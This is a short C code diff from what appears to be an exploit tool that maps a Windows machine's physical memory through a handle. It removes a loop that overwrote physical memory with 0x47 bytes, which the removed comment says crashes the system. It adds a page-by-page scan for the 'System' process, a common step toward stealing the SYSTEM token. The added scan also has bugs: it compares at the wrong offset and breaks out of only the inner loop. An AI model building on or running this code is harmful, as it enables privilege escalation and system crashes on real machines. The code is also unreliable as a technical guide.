@@ -61,14 +61,22 @@ int main(char argc, char** argv)
 	if (buf == 0) {
 		exit(EXIT_FAILURE);
 	}
-	/*
-	Trying to write 0x100000000 to 0x150000000 will cause the system to crash
-	*/
 
-	for (__int64 page = 0x100000000; page < 0x7FFFFFFFFFFF; page = page + 0x1000) {
-		MapPhysicalMemory(hPhysicalMemory, page, 0x1000, buf);
-		memset(buf, 0x47, 0x1000);
-		printf("Set %p to 0x47: \n", (void*)page);
+	printf("\n\nTrying to find SYSTEM in physical memory...\n");
+	for (int i = 0; i < memRegionsCount; i++) {
+		__int64 start = memRegion[i].address;
+		__int64 end = memRegion[i].address + memRegion[i].size;
+		printf("%p - %p\n", (void*)start, (void*)end);
+
+		for (__int64 page = start; page < end; page = page + 0x1000) {
+			MapPhysicalMemory(hPhysicalMemory, page, 0x1000, buf);
+			for (int pageOffset = 0; pageOffset < 0x1000; pageOffset++) {
+				if (memcmp("System\0\0\0\0\0\0\0\0\0", (unsigned char*)(buf + i), 14) == 0) {
+					printf("Found SYSTEM!\n");
+					break;
+				}
+			}
+		}
 	}
 
 	free(buf);
